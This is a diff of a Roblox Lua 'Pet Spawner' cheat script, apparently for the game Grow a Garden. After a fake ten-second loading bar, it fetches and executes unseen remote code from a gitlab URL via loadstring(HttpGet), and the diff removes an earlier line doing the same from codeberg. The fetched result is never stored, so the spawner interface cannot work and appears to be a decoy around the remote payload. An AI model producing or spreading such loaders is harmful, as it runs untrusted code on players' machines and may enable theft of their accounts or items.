@@ -1,2 +1,249 @@
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-Spawner.Load()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Loading UI
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingGui"
+loadingGui.Parent = PlayerGui
+
+local bgFrame = Instance.new("Frame")
+bgFrame.Size = UDim2.new(0, 300, 0, 90)
+bgFrame.Position = UDim2.new(0.5, -150, 0.5, -45)
+bgFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+bgFrame.BorderSizePixel = 0
+bgFrame.Parent = loadingGui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0, 30)
+loadingText.Position = UDim2.new(0, 0, 0, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.Text = "Loading Script - 0%"
+loadingText.Parent = bgFrame
+
+local barBack = Instance.new("Frame")
+barBack.Size = UDim2.new(1, -20, 0, 20)
+barBack.Position = UDim2.new(0, 10, 0, 40)
+barBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBack.BorderSizePixel = 0
+barBack.Parent = bgFrame
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Position = UDim2.new(0, 0, 0, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBack
+
+local madeByText = Instance.new("TextLabel")
+madeByText.Size = UDim2.new(1, 0, 0, 20)
+madeByText.Position = UDim2.new(0, 0, 0, 70)
+madeByText.BackgroundTransparency = 1
+madeByText.TextColor3 = Color3.fromRGB(180, 180, 180)
+madeByText.TextScaled = true
+madeByText.Font = Enum.Font.SourceSansItalic
+madeByText.Text = "Made by kenimm1"
+madeByText.Parent = bgFrame
+
+-- Animate loading bar for 3 seconds
+local duration = 10
+local elapsed = 0
+
+local conn
+conn = RunService.RenderStepped:Connect(function(dt)
+    if elapsed < duration then
+        elapsed = math.min(elapsed + dt, duration)
+        local progress = elapsed / duration
+        barFill.Size = UDim2.new(progress, 0, 1, 0)
+        loadingText.Text = "Loading Script - " .. math.floor(progress * 100) .. "%"
+    else
+        conn:Disconnect()
+        loadingGui:Destroy()
+
+        -- Remove existing PetSpawnerUI if present
+        if PlayerGui:FindFirstChild("PetSpawnerUI") then
+            PlayerGui.PetSpawnerUI:Destroy()
+        end
+
+        -- Load Spawner script first
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+        end)
+        if not success then
+            warn("[PetSpawner] Failed to load spawner script:", err)
+        end
+
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "PetSpawnerUI"
+        gui.IgnoreGuiInset = true
+        gui.ResetOnSpawn = false
+        gui.Parent = PlayerGui
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 250, 0, 310)
+        frame.Position = UDim2.new(0.5, -125, 0.5, -155)
+        frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+        frame.BorderSizePixel = 0
+        frame.Active = true
+        frame.Draggable = true
+        frame.Parent = gui
+
+        local titleBar = Instance.new("Frame")
+        titleBar.Size = UDim2.new(1, 0, 0, 40)
+        titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        titleBar.BorderSizePixel = 0
+        titleBar.Parent = frame
+
+        local title = Instance.new("TextLabel", titleBar)
+        title.Size = UDim2.new(1, -35, 1, 0)
+        title.Position = UDim2.new(0, 10, 0, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "🐾 Pet Spawner"
+        title.Font = Enum.Font.GothamBold
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        title.TextSize = 20
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        title.TextYAlignment = Enum.TextYAlignment.Center
+
+        local minimizeBtn = Instance.new("TextButton", titleBar)
+        minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
+        minimizeBtn.Position = UDim2.new(1, -35, 0, 5)
+        minimizeBtn.Text = "—"
+        minimizeBtn.Font = Enum.Font.GothamBold
+        minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+        minimizeBtn.BackgroundTransparency = 1
+        minimizeBtn.BorderSizePixel = 0
+        minimizeBtn.TextSize = 22
+        minimizeBtn.AutoButtonColor = true
+
+        local container = Instance.new("Frame")
+        container.Size = UDim2.new(1, 0, 1, -40)
+        container.Position = UDim2.new(0, 0, 0, 40)
+        container.BackgroundTransparency = 1
+        container.Parent = frame
+
+        local petNameBox = Instance.new("TextBox", container)
+        petNameBox.Size = UDim2.new(0.9, 0, 0, 28)
+        petNameBox.Position = UDim2.new(0.05, 0, 0, 40)
+        petNameBox.PlaceholderText = "Pet Name"
+        petNameBox.Text = ""  -- Fix: set Text to empty string here
+        petNameBox.ClearTextOnFocus = false
+        petNameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        petNameBox.TextColor3 = Color3.new(1, 1, 1)
+        petNameBox.Font = Enum.Font.Gotham
+        petNameBox.TextSize = 17
+
+        local weightBox = Instance.new("TextBox", container)
+        weightBox.Size = UDim2.new(0.4, 0, 0, 28)
+        weightBox.Position = UDim2.new(0.05, 0, 0, 80)
+        weightBox.PlaceholderText = "Weight"
+        weightBox.Text = ""
+        weightBox.ClearTextOnFocus = false
+        weightBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        weightBox.TextColor3 = Color3.new(1, 1, 1)
+        weightBox.Font = Enum.Font.Gotham
+        weightBox.TextSize = 17
+
+        local ageBox = Instance.new("TextBox", container)
+        ageBox.Size = UDim2.new(0.4, 0, 0, 28)
+        ageBox.Position = UDim2.new(0.55, 0, 0, 80)
+        ageBox.PlaceholderText = "Age"
+        ageBox.Text = ""
+        ageBox.ClearTextOnFocus = false
+        ageBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        ageBox.TextColor3 = Color3.new(1, 1, 1)
+        ageBox.Font = Enum.Font.Gotham
+        ageBox.TextSize = 17
+
+        local spawnButton = Instance.new("TextButton", container)
+        spawnButton.Size = UDim2.new(1, -40, 0, 45)
+        spawnButton.Position = UDim2.new(0, 20, 0, 125)
+        spawnButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        spawnButton.TextColor3 = Color3.new(1, 1, 1)
+        spawnButton.Font = Enum.Font.GothamBold
+        spawnButton.TextSize = 19
+        spawnButton.Text = "Spawn"
+
+        local feedbackLabel = Instance.new("TextLabel", container)
+        feedbackLabel.Size = UDim2.new(1, -40, 0, 28)
+        feedbackLabel.Position = UDim2.new(0, 20, 0, 180)
+        feedbackLabel.BackgroundTransparency = 1
+        feedbackLabel.TextColor3 = Color3.new(1, 1, 1)
+        feedbackLabel.Font = Enum.Font.Gotham
+        feedbackLabel.TextSize = 15
+        feedbackLabel.Text = ""
+
+        local minimized = false
+
+        local function isPositiveNumber(str)
+            local num = tonumber(str)
+            return num and num > 0
+        end
+
+        local function isPositiveIntegerInRange(str, max)
+            local num = tonumber(str)
+            return num and num > 0 and num <= max and math.floor(num) == num
+        end
+
+        spawnButton.MouseButton1Click:Connect(function()
+            local petName = petNameBox.Text:match("^%s*(.-)%s*$") -- trim spaces
+            local weight = tonumber(weightBox.Text)
+            local ageStr = ageBox.Text
+
+            if petName == "" then
+                feedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                feedbackLabel.Text = "Please enter a Pet Name."
+                return
+            end
+            if not isPositiveNumber(weightBox.Text) then
+                feedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                feedbackLabel.Text = "Weight must be a positive number."
+                return
+            end
+            if not isPositiveIntegerInRange(ageStr, 100) then
+                feedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                feedbackLabel.Text = "Age must be a whole number between 1 and 100."
+                return
+            end
+
+            local age = tonumber(ageStr)
+            feedbackLabel.Text = ""
+
+            if typeof(Spawner) ~= "table" or typeof(Spawner.SpawnPet) ~= "function" then
+                feedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                feedbackLabel.Text = "Spawner not loaded correctly."
+                return
+            end
+
+            local success, err = pcall(function()
+                Spawner.SpawnPet(petName, weight, age)
+            end)
+
+            if success then
+                feedbackLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+                feedbackLabel.Text = ("Spawned %s (Weight: %.2f, Age: %d)"):format(petName, weight, age)
+            else
+                feedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                feedbackLabel.Text = "Failed to spawn pet: " .. tostring(err)
+            end
+        end)
+
+        minimizeBtn.MouseButton1Click:Connect(function()
+            minimized = not minimized
+            if minimized then
+                container.Visible = false
+                frame.Size = UDim2.new(0, 250, 0, 40)
+                minimizeBtn.Text = "+"
+            else
+                container.Visible = true
+                frame.Size = UDim2.new(0, 250, 0, 310)
+                minimizeBtn.Text = "—"
+            end
+        end)
+    end
+end)
